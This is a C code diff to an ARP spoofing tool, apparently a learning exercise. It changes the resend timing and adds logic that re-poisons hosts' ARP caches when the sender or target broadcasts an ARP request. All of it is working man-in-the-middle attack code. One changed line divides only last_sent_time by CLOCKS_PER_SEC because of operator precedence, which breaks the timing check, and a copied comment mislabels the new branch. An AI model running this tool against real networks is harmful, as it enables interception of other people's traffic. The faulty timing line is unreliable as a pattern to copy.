@@ -13,6 +13,8 @@ int main(int argc, char* argv[])
         usage();
         return -1;
     }
+    printf("ARP SPOOFING START\n");
+
 // 1. parameter handling
     uint8_t sender_ip[101][4];
     uint8_t sender_mac[101][6];
@@ -53,14 +55,13 @@ int main(int argc, char* argv[])
         fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
         return -1;
     }
-    clock_t t1, t2;
+    time_t last_sent_time;
     bool check = true;
     for(int now_pair = 0; now_pair < sender_target_pair_num; now_pair++){
         while (true) {
             if(!check){ // sent state
-                t2 = clock();
-                // last sent time - now >= RESEND_SEC (5 sec), arp request must be re-sent
-                if ((double)(t2 - t1) / CLOCKS_PER_SEC >= RESEND_SEC){
+                // last sent_time - now(time) >= RESEND_SEC (5 sec), arp request must be re-sent
+                if (time(NULL) - last_sent_time >= RESEND_SEC){
                     check = true;
                 }
             }
@@ -73,7 +74,7 @@ int main(int argc, char* argv[])
                     printf("[Error] packet sending is failed.\n");
                     return -1;
                 } // send twice
-                t1 = clock(); // last sent time
+                last_sent_time = time(NULL); // save last sent time
                 check = false;
             }
             
@@ -99,9 +100,8 @@ int main(int argc, char* argv[])
     for(int now_pair = 0; now_pair < sender_target_pair_num; now_pair++){
         while (true) {
             if(!check){ // sent state
-                t2 = clock();
                 // last sent time - now >= RESEND_SEC (5 sec), arp request must be re-sent
-                if ((double)(t2 - t1) / CLOCKS_PER_SEC >= RESEND_SEC){
+                if (time(NULL) - last_sent_time / CLOCKS_PER_SEC >= RESEND_SEC){
                     check = true;
                 }
             }
@@ -114,7 +114,7 @@ int main(int argc, char* argv[])
                     printf("[Error] packet sending is failed.\n");
                     return -1;
                 } // send twice
-                t1 = clock(); // last sent time
+                last_sent_time = time(NULL); // last sent time
                 check = false;
             }
             
@@ -209,12 +209,10 @@ int main(int argc, char* argv[])
 // in this stage, if packet means ARP request (ARP recovery) we can maintain by arp inject (again)
 
     // receive from sender / send to target
-            t1 = clock();
+            time_t check_time = time(NULL);
             while(true) {
                     // time check
-                t2 = clock();
-                if((t2 - t1) / CLOCKS_PER_SEC > 3) printf("now\n");
-                if ((t2 - t1) / CLOCKS_PER_SEC >= RESEND_SEC){ // if relay state lasts longer than RESEND_SEC(5 sec), try re-inject
+                if (time(NULL) - check_time >= RESEND_SEC){ // if relay state lasts longer than RESEND_SEC(5 sec), try re-inject
                     time_arp_spoof_reinfect = true;
                     break;
                 }
@@ -285,12 +283,22 @@ int main(int argc, char* argv[])
                                 // 5. another case: target's ARP request broadcasting
                                 if(memcmp((uint8_t *)packet + ARP_SOURCE_MAC_ADDR, target_mac[now_pair], MAC_address_length) == 0){ // check sender ip addr
                                     if(memcmp((uint8_t *)packet + ARP_DESTINATION_MAC_ADDR, broadcast, MAC_address_length) == 0){ // check broadcast
-                                        printf("[Detected] ARP Request from target to another sender (broadcast).\n");
+                                        printf("[Detected] ARP Request from target to another device (broadcast).\n");
                                         need_arp_spoof_reinfect = true;
                                         need_arp_spoof_reinfect_packet[now_pair] = true;
                                         break;
                                     }
                                 }
+                                // 5. another case: target's ARP request broadcasting
+                                else if(memcmp((uint8_t *)packet + ARP_SOURCE_MAC_ADDR, sender_mac[now_pair], MAC_address_length) == 0){ // check sender ip addr
+                                    if(memcmp((uint8_t *)packet + ARP_DESTINATION_MAC_ADDR, broadcast, MAC_address_length) == 0){ // check broadcast
+                                        printf("[Detected] ARP Request from sender to another device (broadcast).\n");
+                                        need_arp_spoof_reinfect = true;
+                                        need_arp_spoof_reinfect_packet[now_pair] = true;
+                                        break;
+                                    }
+                                }
+                                else{}
                             }
                         }
                     }
